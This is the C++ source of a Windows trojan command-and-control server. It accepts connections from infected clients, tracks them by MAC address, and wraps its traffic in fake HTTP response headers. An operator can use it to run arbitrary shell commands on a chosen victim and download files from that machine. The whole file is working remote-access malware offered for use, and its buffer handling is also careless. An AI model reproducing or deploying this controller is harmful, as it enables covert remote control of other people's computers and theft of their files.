//#include "stdafx.h"
#include <iostream>
#include <winsock2.h>
#include <string.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
char IP[50] = "";
int port;
#define FILESIZE        65535
#define MAX_CMD_LEN		2560
#define MAC_ADDR_LEN	25
char http_req_hdr_tmpl[] = "HTTP/1.1 200 OK\r\nServer: bpg's Server <0.1>\r\n"
    "Accept-Ranges: bytes\r\nContent-Length: %d\r\nConnection: close\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n\r\n%s";


struct TROJAN_INFO{
	int liveflag;
	char mac[MAC_ADDR_LEN];
	SOCKET ClientSocket;
};

#define MAX_CLIENT_NUM		10
int Trojan_Number = 0;  //当前连接总数
TROJAN_INFO Trojan_Table[MAX_CLIENT_NUM];

int Send(SOCKET s, char buf[], int no_use)
{
	char buff[MAX_CMD_LEN] = "";
	sprintf(buff,http_req_hdr_tmpl,strlen(buf),buf);
	return send(s, buff, strlen(buff)+1, 0);
}

int Recv(SOCKET s,char buf[],int len,int flag)
{
	char RecvBuff[MAX_CMD_LEN] = "";
	char File[MAX_CMD_LEN] = "";
	int iResult = recv(s,RecvBuff,MAX_CMD_LEN,NULL);
	strcpy(File,strstr(RecvBuff,"Content") + 9 );
	strncpy(buf,File,strlen(File)-2);
	return iResult;
}

void remove_Trojan(char *MacAddr)
{
	int i ;
	for (i = 0;i<Trojan_Number;i++)
		if (strcmp(MacAddr,Trojan_Table[i].mac))
			break;
	Trojan_Number -- ;
	for (int j = i;j<Trojan_Number;j++)
		Trojan_Table[j] = Trojan_Table[j+1];
}

void add_Trojan(char MacAddr[],SOCKET ClientSocket)
{
	int i;
	for (i = 0;i<Trojan_Number;i++)
		if (!strcmp(MacAddr,Trojan_Table[i].mac)) //有相同的就退出
			return;
	i = Trojan_Number++;
	strcpy(Trojan_Table[i].mac,MacAddr);
	Trojan_Table[i].ClientSocket = ClientSocket;
}


int  RecvFile(char FileName[],int clientsocket){ //定长接收
	long Length;
	char length[8] = "";
	FILE * fp = fopen(FileName,"wb");
	int iResult = Recv(clientsocket,length , sizeof(long), NULL);
	Length = atoi(length);
	printf("\nRecv File Length : %d\n",Length);
	int cnt=0;
	while(cnt < Length){
		char buffer[FILESIZE + 1] = "";
		int iResult = Recv(clientsocket, buffer, FILESIZE, NULL);
		cout<<"Content : "<<buffer<<endl;
		cnt += iResult;
		if(iResult == 0) break;
		fwrite(buffer,strlen(buffer),1,fp);
    }
	fclose(fp);
	return iResult;
}

DWORD WINAPI Trojan_Operation(LPVOID lpParameter) //Trojan连接
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	//*******获取mac
	char Mac[100] = "";
	char heartbeat[20] = "";
	Recv(ClientSocket, Mac, MAC_ADDR_LEN, NULL);
	Recv(ClientSocket, heartbeat, MAC_ADDR_LEN, NULL);
	printf("Client Mac : %s\n", Mac);
	char mac[100] = "";
	strncpy(mac,Mac,strlen(Mac)-1);
	add_Trojan(mac,ClientSocket); //添加木马
	return 1;
}

DWORD WINAPI User_Option(LPVOID lpParameter){
	int i;
	bool quit = 0;
	while(1){
		if (Trojan_Number == 0){
			Sleep(1);
			continue;
		}
		//*******打印trojan表
		printf("********************************************\n");
		printf("Trojan Number : %d\n",Trojan_Number);
		for (i = 0;i < Trojan_Number; i ++)
			printf("%d Mac:%s\n",i+1,Trojan_Table[i].mac);
		//printf("********************************************\n");
		printf("Print Trojan Mac:");
		char User_Mac[MAC_ADDR_LEN];
		gets_s(User_Mac);
		//*******输入mac获取目标木马socket
		SOCKET ClientSocket = 0;
		for (i = 0;i < Trojan_Number;i++)
			if (!strcmp(User_Mac,Trojan_Table[i].mac)){
				ClientSocket = Trojan_Table[i].ClientSocket;
				break;
			}
		if (!ClientSocket){
			printf("No this Trojan!\n");
			continue;
		}
		//*******与木马进行交互
		while (TRUE)
		{
			//输入CMD
			int quit = 1;
			printf("********************************************\n");
			char Cmd[MAX_CMD_LEN] = "";
			printf("Please input Operation : \n         0(quit) \n         1(Cmd) (1 CMD)\n         2(download) (2 remotefile localfile)   \nCMD:");
			printf("------------------------------------------------------\n");
			gets_s(Cmd);
			int CmdNo = Cmd[0] - '0',iResult;
			char recvbuf[MAX_CMD_LEN] = ""; //Cmd操作
			char local_file[20] = "";   //文件操作
			char FileName[100] = "";
			switch (CmdNo)
			{
			case 0:
				quit = 0;
				iResult = Send(ClientSocket, Cmd, 0);
				break;
			case 1:
				iResult = Send(ClientSocket, Cmd, 0);
				quit = Recv(ClientSocket, recvbuf, MAX_CMD_LEN, NULL);
				printf("Result : \n%s\n",recvbuf);
				break;
			case 2:
				strcpy(local_file,strchr(Cmd+2,' ')+1);
				printf("download file save as %s ......",local_file );
				strncpy(FileName,Cmd,strlen(Cmd) - strlen(local_file) - 1);
				Send(ClientSocket, FileName , 0);
				quit = RecvFile(local_file,ClientSocket);
				cout << "Receive File Success!" << endl;
				break;
			default:
				printf("format error!\n");
			}
			if (quit<=0) break;
		}
	}	
	return 0;	
}

SOCKET Socket_Init(){
	SOCKET ServerSocket;
	sockaddr_in LocalAddr;
	ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr(IP);
	LocalAddr.sin_port = htons(port);
	memset(LocalAddr.sin_zero, 0x00, 8);
	bind(ServerSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	listen(ServerSocket, 10);
	return ServerSocket;
}

int main(int argc, char* argv[]){
	if (argc!=3){
		printf("server.exe ip port");
	//	exit();
	}
	memcpy(IP,argv[1],strlen(argv[1])); 
	port = atoi(argv[2]);
	WSADATA  Ws;
	SOCKET ServerSocket, ClientSocket;
	WSAStartup(MAKEWORD(2, 2), &Ws);
	ServerSocket = Socket_Init();
	cout << "Server Start" << endl;

	HANDLE User_Thread = CreateThread(NULL, 0, User_Option, NULL, 0, NULL);
	CloseHandle(User_Thread);
	while (true)
	{
		sockaddr_in ClientAddr;
		int AddrLen = sizeof(ClientAddr);
		ClientSocket = accept(ServerSocket, (struct sockaddr*)&ClientAddr, &AddrLen);
		if (ClientSocket == INVALID_SOCKET){
			printf("Connect Error!");
			break;
		}
		cout << "Client Connect " << inet_ntoa(ClientAddr.sin_addr) << ":" << ntohs(ClientAddr.sin_port )<<endl;
		HANDLE Trojan_Thread = CreateThread(NULL, 0, Trojan_Operation, (LPVOID)ClientSocket, 0, NULL);
		CloseHandle(Trojan_Thread);
	}
	Sleep(INFINITE);
	closesocket(ServerSocket);
	WSACleanup();

	return 0;
}